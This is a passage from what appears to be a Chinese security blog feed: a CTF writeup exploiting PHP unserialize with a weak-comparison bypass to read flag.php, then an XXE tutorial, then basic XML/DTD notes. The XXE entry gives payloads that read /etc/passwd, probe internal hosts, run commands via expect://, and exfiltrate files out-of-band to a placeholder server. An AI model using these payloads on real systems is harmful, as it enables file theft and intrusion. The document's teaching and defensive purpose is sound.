keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>writeup：</strong></p><p><strong>分析:</strong></p><ol><li>根据题目及源码中unserialize()判断此题考查反序列化</li></ol><p>  <img src="https://img-blog.csdnimg.cn/20210429224110400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li><p>flag存储在flag.php中</p><p><img src="https://img-blog.csdnimg.cn/20210429224125343.jpg" alt="在这里插入图片描述"></p></li></ol><ol start="3"><li><p>题目中有两个魔术方法： <strong>construct()、destruct()</strong></p><p> <img src="https://img-blog.csdnimg.cn/20210429224136782.jpg" alt="在这里插入图片描述"></p></li></ol><p>  <img src="https://img-blog.csdnimg.cn/20210429224149702.jpg" alt="在这里插入图片描述"></p><ol start="4"><li>destruct()中会调用process,且op=1写入,op=2读取</li></ol><p>  <img src="https://img-blog.csdnimg.cn/20210429224243312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  <img src="https://img-blog.csdnimg.cn/20210429224323475.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="5"><li>涉及对象FileHandler,变量op及filename,content,进行构造输出.</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass FileHandler &#123;    public $op&#x3D;&#39; 2&#39;;    public $filename&#x3D;&#39;flag.php&#39;;    public $content&#x3D;&#39;jaa&#39;;                 &#x2F;&#x2F;变量content不涉及题目可随意填写&#125;$flag &#x3D; new FileHandler();$flag_1 &#x3D; serialize($flag);echo $flag_1;    ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>涉及:反序列化魔术方法调用，弱类型绕过,ascii绕过</strong></p><ol><li><p><code>使用该类对flag进行读取,这里面能利用的只有__destruct函数(析构函数)。__destruct函数对this-&gt;op进行了===判断并内容在2字符串时会赋值为1.</code></p><p><code>procesa函数中使用==对$this-&gt;op进行判断(为2的情况下才能读取内容),因此这里存在弱类型比较,可以使用数字2或``字符串&#39; 2&#39;绕过判断。</code></p></li></ol><p><img src="https://img-blog.csdnimg.cn/20210429224343769.jpg" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210429224403987.jpg" alt="在这里插入图片描述"></p><ol start="2"><li><code>is_valid函数还对序列化字符串进行了校验，因为成员被protected修饰,因此序列化字符串中会出现ascii为0的字符。经过测试,在PHP7.2+的环境中,使用publie修饰成员并序列化,反序列化后成员也会被public覆盖修饰。</code></li></ol><p><strong>实操:</strong></p><p>上述步骤5构造输出:</p><p><img src="https://img-blog.csdnimg.cn/20210429224418905.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得到序列化后的字符串</p><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;jaa&quot;;&#125;</code></p><p>将该字符串传递给参数str并在url中以GET方式进行传参</p><p><code>https://IP/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;jaa&quot;;&#125;</code></p><p>之后查看源代码得到flag.</p><p><img src="https://img-blog.csdnimg.cn/20210429224441269.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞介绍</title>
      <link href="/2022/01/15/xxe-lou-dong/"/>
      <url>/2022/01/15/xxe-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p><strong>前置知识：</strong>    </p><p>​    XML被设计为传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。其焦点是数据的内容。 详情–&gt;<a href="">XML基础介绍</a></p><h2 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h2><p>​    <strong>XXE</strong>（XML External Entity Injection）即<strong>XML</strong>外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h2 id="XXE漏洞触发点"><a href="#XXE漏洞触发点" class="headerlink" title="XXE漏洞触发点"></a>XXE漏洞触发点</h2><p>可以上传XML文件的位置且未对XML文件进行过滤</p><h2 id="XXE漏洞检测"><a href="#XXE漏洞检测" class="headerlink" title="XXE漏洞检测"></a>XXE漏洞检测</h2><ul><li>Content-Type值判断</li></ul><p>​    可以使用BurpSuite抓取数据包查看。若<code>Content-type=text/xml</code>或<code>Content-type=application/xml</code>；表示接收数据为xml格式，可进行漏洞检测。</p><ul><li><p>更改Content-Type为xml类型进行尝试</p></li><li><p>数据格式类型判断</p></li></ul><p>​    类似于<code>&lt;user&gt;test&lt;/user&gt;&lt;pass&gt;Mikasa&lt;/pass&gt;</code>典型xml格式</p><h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><p><strong>补充：支持的协议</strong></p><table><thead><tr><th>Libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file</td><td>file</td><td>file</td><td>file</td></tr><tr><td>http</td><td>http</td><td>http</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>ftp</td></tr><tr><td></td><td>php</td><td>https</td><td>https</td></tr><tr><td></td><td>comepress.zlib</td><td>jar</td><td></td></tr><tr><td></td><td>comepress.bzip2</td><td>netdoc</td><td></td></tr><tr><td></td><td>data</td><td>mailto</td><td></td></tr><tr><td></td><td>glob</td><td>gopher *</td><td></td></tr><tr><td></td><td>phar</td><td></td><td></td></tr></tbody></table><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p><strong>协议</strong></p><ul><li>读文件-通过DTD外部实体声明</li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>内网探针-将xxe转换为ssrf</p><p>我们利用这种方法可进行内网探测：某个内网ip是否存在、对应路径文件是否存在、端口扫描等等。根据返回类型(无回显可尝试根据响应时间长度判断)的不同来判断我们想要的结果。例如：请求正确时界面无变化、请求错误时进行报错。如下测试内网是否存在ip:192.168.0.103、该ip是否开启80端口、是否存在index.txt文件。</p></li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.103:80&#x2F;index.txt&#x2F;&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>RCE（此类型在实战中并不常见，须在安装expect扩展的PHP环境里执行命令）</li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;            &lt;!--id为执行的系统命令--&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>外部应用</strong></p><ul><li>引入外部实体</li></ul><p>在自己的服务器下放一个evil.dtd文件，通过DTD外部实体声明引入DTD文档<code>http://example.com/evil.dtd</code>，再通过解析evil.dtd文件引入外部实体声明。</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [       &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;evil.dtd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt; &lt;!--http:&#x2F;&#x2F;example.com&#x2F;evil.dtd内容为--&gt;&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="无回显（Blind-XXE）"><a href="#无回显（Blind-XXE）" class="headerlink" title="无回显（Blind XXE）"></a>无回显（Blind XXE）</h3><p><strong>OOB(Out-Of-Band)：</strong>使用Blind XXE 漏洞来构建一条外带数据OOB（Out-Of-Band）通道来读取数据。</p><p>​    原理：带着获取的文件源码以 get 参数或其他形式去访问我们的服务器，然后在日志里就可以找到我们要获取的内容了-反向链接配合。</p><p><strong>实例</strong>：<code> xxx.dtd</code>文件内容：<br><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://xxx/x.php?hs=%hs;&#39;&gt;&quot;&gt;  </code></p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % hs SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.dtd&quot;&gt;&lt;!--在自己的服务器创建xxx.dtd文件--&gt;%remote;&lt;!--把外部文件（xxx.dtd）引入XML中--&gt;%all;&lt;!--替换为后边的嵌套实体--&gt;]&gt;&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;&lt;!--在自己的服务器访问读取的内容--!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了读取数据的准确性这里可以用<strong>base64</strong>进行将读取内容进行编码。如下：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % hs SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;C:&#x2F;1.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.dtd&quot;&gt;&lt;!--在自己的服务器创建xxx.dtd文件--&gt;%remote;&lt;!--把外部文件（xxx.dtd）引入XML中--&gt;%all;&lt;!--替换为后边的嵌套实体--&gt;]&gt;&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;&lt;!--在自己的服务器访问读取的内容--!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a>XXE漏洞防御</h2><ul><li>禁用外部实体</li></ul><p>禁用外部实体方法：</p><pre class="line-numbers language-none"><code class="language-none">PHP：libxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python：from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>过滤用户提交xml数据</p><p>关键词<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、<code>SYSTEM</code>、<code>PUBLIC</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML基础介绍</title>
      <link href="/2022/01/15/xml-ji-chu/"/>
      <url>/2022/01/15/xml-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h2><p>​    XML（EXtensible Markup Language）可扩展标记语言。XML是一种标记语言，很类似HTML，但并非HTML的替代，XML设计的宗旨是<strong>传输数据</strong>而非<strong>显示数据</strong>。</p><!--XML被设计为传输和存储数据，其焦点是**数据的内容**。--><!--HTML被设计用来显示数据，其焦点是**数据的外观*。--><h2 id="XML文档构建模块"><a href="#XML文档构建模块" class="headerlink" title="XML文档构建模块"></a>XML文档构建模块</h2><h3 id="一个-XML-文档实例-元素"><a href="#一个-XML-文档实例-元素" class="headerlink" title="一个 XML 文档实例-元素"></a>一个 XML 文档实例-元素</h3><p>XML 文档必须有一个元素是所有其他元素的<strong>父元素</strong>。该元素称为<strong>根元素</strong>。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--XML声明,定义 XML 的版本 (1.0) 和所使用的编码 UTF-8--></span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token comment">&lt;!--根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--4个子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--根元素结尾--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一个-XML-文档实例-属性"><a href="#一个-XML-文档实例-属性" class="headerlink" title="一个 XML 文档实例-属性"></a>一个 XML 文档实例-属性</h3><p>​    XML 元素可以在开始标签中包含属性，且属性值必须被引号包围，单引号和双引号均可使用。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span> <span class="token attr-name">sex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--sex是一个属性--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Anna<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span>Smith<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sex</span><span class="token punctuation">></span></span>female<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sex</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--sex是一个子元素--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Anna<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span>Smith<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>​    实体是用来定义普通文本的变量。实体引用是对实体的引用。所有实体均以<code>&amp;</code>开始，以<code>;</code>结束。当文档被XML解析器解析时，实体就会被展开。下面实体在XML中被预定义。</p><table><thead><tr><th>实体引用</th><th>字符</th></tr></thead><tbody><tr><td><code>&amp;lt;</code></td><td>&lt;</td></tr><tr><td><code>&amp;gt;</code></td><td>&gt;</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td></tr><tr><td><code>apos;</code></td><td>‘</td></tr></tbody></table><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>​    PCDATA的意思是<strong>被解析</strong>的<strong>字符数据</strong>。可想象为开始标签与结束标签之间的文本，是会被解析器解析的文本，这些文本将被解析器<strong>检查实体</strong>以及<strong>标记</strong>。文本中的标签会被当作标记来处理，而实体会被展开。</p><p>​    被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 <code>&amp;amp;</code>、<code>&amp;lt; </code>以及<code> &amp;gt;</code> 实体来分别替换它们。</p><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>​    CDATA 的意思是字符数据（character data）。</p><p>​    CDATA 是<strong>不会被解析器解析</strong>的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</p><h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p>​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 <strong>XML 文档中</strong>，也可作为一个<strong>外部引用</strong>。</p><h2 id="一个DTD在XML内部声明的实例"><a href="#一个DTD在XML内部声明的实例" class="headerlink" title="一个DTD在XML内部声明的实例"></a>一个DTD在XML内部声明的实例</h2><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!--XML声明,定义 XML 的版本 (1.0)--&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是note类型的文档--&gt;  &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note有4个元素：“to、from、heading、body”--&gt;  &lt;!ELEMENT to      (#PCDATA)&gt;  &lt;!--定义 to 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT from    (#PCDATA)&gt;&lt;!--定义 from 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!--定义 heading 元素为 &quot;#PCDATA&quot; 类型--&gt;  &lt;!ELEMENT body    (#PCDATA)&gt;&lt;!--定义 body 元素为 &quot;#PCDATA&quot; 类型--&gt;]&gt;&lt;note&gt;  &lt;to&gt;George&lt;&#x2F;to&gt;  &lt;from&gt;John&lt;&#x2F;from&gt;  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一个DTD在XML外部声明的实例"><a href="#一个DTD在XML外部声明的实例" class="headerlink" title="一个DTD在XML外部声明的实例"></a>一个DTD在XML外部声明的实例</h2><p>​    若 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>包含DTD的“note.dtd”文件:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拥有外部DTD文档实例：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;!--包含DTD的“note.dtd”文件,封装在DOCTYPE定义中--&gt;&lt;note&gt;&lt;to&gt;George&lt;&#x2F;to&gt;&lt;from&gt;John&lt;&#x2F;from&gt;&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt; <span aria-hidden="true" 